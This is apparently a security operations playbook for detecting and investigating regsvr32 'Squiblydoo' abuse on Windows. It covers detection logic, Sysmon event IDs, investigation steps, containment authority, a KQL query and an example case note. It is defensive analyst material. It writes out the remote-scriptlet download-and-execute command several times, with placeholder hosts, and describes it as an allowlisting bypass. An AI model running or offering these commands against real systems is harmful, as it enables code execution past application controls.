# regsvr32 Abuse

**Category:** Endpoint – Execution & LOLBins
**Playbook ID:** EP-008

`regsvr32.exe` is a signed Microsoft binary whose entire job is to register and unregister COM DLLs (`DllRegisterServer` / `DllUnregisterServer` exports). It's on every Windows build, it's rarely blocked by application control policies because blocking it breaks legitimate software installers, and — critically — it can load and execute a remote scriptlet without ever writing a second file to disk. That last property is what makes it a LOLBin worth its own playbook rather than a footnote under "suspicious process." The technique most analysts will actually see referenced by name is "Squiblydoo": `regsvr32.exe /s /n /u /i:http://<host>/payload.sct scrobj.dll`. If you only remember one command-line pattern from this playbook, remember that one.

## Business Risk

**[STAKEHOLDER]** - regsvr32 abuse matters because it's a documented bypass for application allowlisting controls like AppLocker and WDAC — the exact controls the business is relying on to say "only approved software runs here." An attacker who's already delivered a phishing payload or gained initial access uses regsvr32 to execute a remote script or a malicious DLL under the cover of a trusted, digitally-signed Microsoft process, with nothing new landing on disk for endpoint AV to scan. The risk isn't the binary itself — it's that a control the business paid for and is relying on for compliance attestations quietly doesn't cover this path unless it's been explicitly hardened for it.

## Severity / Priority Default

**Medium**, escalating to **High** when the command line references a remote URL (`/i:http` or `/i:https`), when `scrobj.dll` is the module being loaded, when the parent process is a script host or Office application, or when the source host is a server, domain controller, or privileged-user workstation.

## MITRE ATT&CK Techniques

- T1218.010 System Binary Proxy Execution: Regsvr32 (primary technique)
- T1204 User Execution (initial trigger — phishing attachment/link, malicious document)
- T1105 Ingress Tool Transfer (remote scriptlet or DLL fetch via `/i:http`)
- T1027 Obfuscated Files or Information (scriptlet content is frequently obfuscated JScript/VBScript)
- T1059.001 Command and Scripting Interpreter: PowerShell (common launcher/wrapper for the regsvr32 call)

## Trigger / Detection Logic Summary

Fires on process-creation telemetry when `regsvr32.exe` executes with **any** of the following:

- Command line contains `/i:http`, `/i:https`, or any URL/IP literal (the Squiblydoo remote-scriptlet pattern).
- Command line loads `scrobj.dll` explicitly alongside `/i:` — this combination has essentially no legitimate business use case.
- Target DLL path sits in `%TEMP%`, `%APPDATA%`, `\Downloads\`, or another user-writable location rather than `System32`/`SysWOW64`/a vendor Program Files folder.
- `/s` (silent) combined with `/u` (unregister) or `/n /i` used together — a combination rarely seen in normal installer behaviour, which usually registers rather than silently unregisters-and-reregisters.
- Parent process is `winword.exe`, `excel.exe`, `wscript.exe`, `cscript.exe`, `powershell.exe`, `cmd.exe`, or a browser — regsvr32 is almost never legitimately spawned by these.
- Target DLL/scriptlet hash is first-seen in the environment with no corresponding change record or software deployment.

## Required Log Sources & Event IDs

| Source | Event ID | Purpose |
|---|---|---|
| Sysmon | 1 (Process Creation) | Primary signal — full command line, parent chain, hashes, integrity level |
| Windows Security | 4688 (New Process) | Fallback if Sysmon absent; command line only if auditing enabled |
| Sysmon | 3 (Network Connection) | Confirms the `/i:http` fetch — destination IP/domain, port |
| Sysmon | 22 (DNSEvent) | Domain resolution attributed to the exact `regsvr32.exe` ProcessGuid |
| Sysmon | 7 (Image Loaded) | Confirms `scrobj.dll` (or another module) actually loaded into the process |
| Sysmon | 11 (FileCreate) | Any DLL/scriptlet dropped to disk before or during registration |
| Sysmon | 12/13 (RegistryEvent) | COM hijack persistence — new/modified CLSID `InprocServer32` key pointing at attacker DLL |
| Microsoft-Windows-PowerShell/Operational | 4104, 4103 | If a PowerShell wrapper built or launched the regsvr32 command line |
| Sysmon | 23 (FileDelete) | Anti-forensics — attacker deleting the dropped DLL/scriptlet after execution |

## Key Fields to Inspect

**[ANALYST]**

- `CommandLine` — the full string; `/i:`, `/s`, `/n`, `/u` flags and the target module/URL are all here.
- `Image` — confirm it's the genuine `C:\Windows\System32\regsvr32.exe` or `SysWOW64` copy, not a renamed binary sitting elsewhere.
- `ParentImage` / `ParentCommandLine` — what triggered the call; this is usually the more damning half of the story.
- `ImageLoaded` (Sysmon 7) — did `scrobj.dll` actually load, confirming scriptlet execution rather than a harmless failed attempt?
- Destination IP/domain from Sysmon 3/22 tied to the exact `ProcessGuid` — the remote host serving the `.sct` file.
- Registry `TargetObject` under `HKCU\Software\Classes\CLSID\{...}\InprocServer32` or `HKLM` equivalent — look for a path pointing outside standard system directories.
- `User` / `LogonId` — was this interactive (correlate to 4624/4648) or triggered by an automated/service context nobody was watching?
- `Hashes` on the target DLL, if one was registered locally rather than fetched remotely.

## Normal vs Suspicious Pattern

| Attribute | Normal | Suspicious |
|---|---|---|
| Command line | `regsvr32.exe /s C:\Program Files\Vendor\component.dll` | `regsvr32.exe /s /n /u /i:http://185.x.x.x/payload.sct scrobj.dll` |
| Module referenced | Vendor-signed DLL shipped with an installer | `scrobj.dll` combined with `/i:` and a URL |
| Parent process | `msiexec.exe`, an installer's own setup executable, `explorer.exe` | `winword.exe`, `wscript.exe`, `powershell.exe`, a browser |
| DLL location | `System32`, `SysWOW64`, `Program Files\<Vendor>` | `%TEMP%`, `%APPDATA%`, `\Downloads\` |
| Network activity | None — most legitimate COM registration is purely local | Outbound connection to a raw IP or newly-registered domain within seconds of launch |
| Frequency | Tied to a known install/patch event, seen once per deployment | First-seen on the host, no corresponding change ticket |

## Investigation Steps

1. Pull the full Sysmon Event ID 1 record for the alerting `regsvr32.exe` process — command line, parent command line, hashes, `ProcessGuid`.
2. Parse the command line for the `/i:` argument specifically — if it points to a URL or IP, this is very likely Squiblydoo-pattern remote scriptlet execution, not routine DLL registration.
3. Check Sysmon Event ID 3/22 for network connections or DNS queries attributed to that `ProcessGuid` in a tight window (±5 minutes) — confirm whether the fetch actually succeeded or the process errored out with no callout.
4. Check Sysmon Event ID 7 for `scrobj.dll` (or the referenced module) actually loading into the process — a command line alone doesn't prove execution if the fetch failed or was blocked.
5. Walk the parent chain up to the root cause — Office document, script host, browser download — this is almost always where the actual initial-access vector lives, and where the linked delivery playbook picks up.
6. Check Sysmon Event ID 12/13 for registry writes under `CLSID\...\InprocServer32` in the same ±5 minute window used in step 3 — regsvr32 abuse is frequently used to establish COM hijack persistence, not just one-shot execution.
7. If content was retrieved, pull it via the URL (in an isolated analysis environment, never directly from the SOC workstation) or check EDR's captured-content feature — de-obfuscate the JScript/VBScript scriptlet body.
8. Confirm user/host context: interactive session (correlate `LogonId` to 4624/4648) versus unattended/service execution, and check whether the host is a standard endpoint or a higher-value asset (server, DC, privileged user).

## True Positive Indicators

- Command line contains `/i:http` or `/i:https` referencing `scrobj.dll`, with confirmed network callout and content retrieval.
- Parent process is a script host, Office application, or browser with no legitimate reason to invoke `regsvr32.exe`.
- Target DLL registered from a user-writable path with no matching software deployment record.
- COM hijack registry key (`InprocServer32`) written or modified pointing at a non-standard path immediately after the regsvr32 call.
- Retrieved scriptlet content decodes to a known offensive-tooling loader pattern (download-and-execute, in-memory stager).

## False Positive / Benign Positive Indicators

- Standard software installer (MSI/EXE) registering a signed vendor DLL from its own Program Files directory, matching a change record or patch cycle.
- RMM or internal deployment tooling that legitimately re-registers COM components as part of an update — should be allow-listed; if not, feed back to detection engineering.
- Developer workstation registering a locally-built COM DLL during normal development work (verify against known dev activity/asset tagging).
- One-off unregister/register pair (`/u` then no `/i:`) tied to a documented troubleshooting step from IT support.

## Escalation Criteria

Escalate to Tier 2 / IR when the `/i:http` remote-scriptlet pattern is confirmed with a successful network fetch, when COM hijack persistence is found, when the source host is a server/DC or belongs to a privileged user, when the retrieved scriptlet decodes to known malicious tooling, or when the same URL/domain or command-line pattern appears across more than one host within a 7-day lookback (extend to 30 days once confirmed True Positive) — that's a spreading intrusion, not an isolated LOLBin curiosity.

## Containment Options & Approval Authority

**[MANAGEMENT]**

| Action | Authority |
|---|---|
| EDR-isolate the single endpoint pending investigation | Tier 1/2 analyst, no additional approval, reversible |
| Kill the `regsvr32.exe` process and any child processes via EDR live-response | Tier 2 analyst |
| Block the remote domain/IP and hash at proxy/firewall/EDR | Tier 2 analyst, notify detection engineering for rule tuning |
| Remove COM hijack registry persistence | Tier 2 analyst, document exact key/value removed for the case record |
| Disable the user account (if credential misuse or lateral spread suspected) | IR lead approval, coordinate with IAM/HR |
| Isolate a server/DC-class asset | IR lead + infrastructure owner sign-off (production impact) |

SLA target: triage start within 30 minutes of alert for Medium severity, within 15 minutes once the `/i:http` remote-scriptlet pattern or a server/DC source host escalates the case to High.

## Example Query (KQL – Microsoft Defender / Sentinel)

```kql
DeviceProcessEvents
| where FileName =~ "regsvr32.exe"
| where ProcessCommandLine has_any ("/i:http", "/i:https", "scrobj.dll")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
```

## Closure Criteria

Close as **True Positive** once the host is isolated/remediated, the remote domain/IP and hash are blocked fleet-wide, any COM hijack registry persistence is removed, and no further callout activity is observed for 24 hours. Close as **Benign Positive** once the command line, parent process, and target DLL are confirmed against a known software deployment or change record. Close as **Insufficient Evidence** when command-line auditing was disabled on the source host, Sysmon wasn't deployed there, or the process exited before network/file telemetry could be captured — note the specific telemetry gap so detection engineering can address coverage rather than forcing a verdict.

**Example case note:**
> 2026-09-15 09:47 UTC — `regsvr32.exe` (PID 6288) spawned by `winword.exe` on host `WKS-LEGAL-021` (user `d.hooper`), command line `regsvr32.exe /s /n /u /i:http://cdn-assets-verify[.]com/inv0442.sct scrobj.dll`. Sysmon ID 3 confirmed outbound to 45.x.x.x:80 within 2s of launch; Sysmon ID 7 confirmed `scrobj.dll` load. Retrieved scriptlet (via sandboxed fetch) decoded to a JScript stager referencing a second-stage PowerShell download. No COM hijack persistence found (ID 12/13 clean). Host isolated via EDR, domain and hash blocked fleet-wide, mailbox search located the delivering attachment (macro-enabled invoice lure). Closed as True Positive; handed to email-phishing playbook for delivery-vector remediation and user awareness follow-up.
